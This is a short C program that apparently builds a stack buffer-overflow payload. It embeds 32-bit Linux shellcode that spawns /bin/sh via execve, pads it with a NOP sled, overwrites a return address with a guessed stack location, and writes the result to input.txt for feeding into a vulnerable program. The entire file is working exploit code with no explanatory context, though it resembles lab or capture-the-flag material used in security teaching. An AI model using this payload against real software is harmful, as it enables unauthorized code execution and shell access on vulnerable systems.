#include <string.h>
#include <stdio.h>

char shellcode[] =
  "\x31\xc0"             // xor    %eax,%eax
  "\x50"                 // push   %eax
  "\x68\x2f\x2f\x73\x68" // push   $0x68732f2f
  "\x68\x2f\x62\x69\x6e" // push   $0x6e69622f
  "\x89\xe3"             // mov    %esp,%ebx
  "\x50"                 // push   %eax
  "\x53"                 // push   %ebx
  "\x89\xe1"             // mov    %esp,%ecx
  "\x99"                 // cdq
  "\xb0\x0b"             // mov    $0xb,%al
  "\xcd\x80";            // int    $0x80
int main() {
    char buffer[200];
    memset(buffer, 0x90, sizeof(buffer)); // NOP sled
    memcpy(buffer + 100, shellcode, sizeof(shellcode)-1); // place shellcode after NOPs

    // Replace this address with the guessed address of buffer on stack
    *(long *) (buffer + 196) = 0xffffd060;
    FILE *f = fopen("input.txt", "w");
    fwrite(buffer, 1, sizeof(buffer), f);
    fclose(f);
}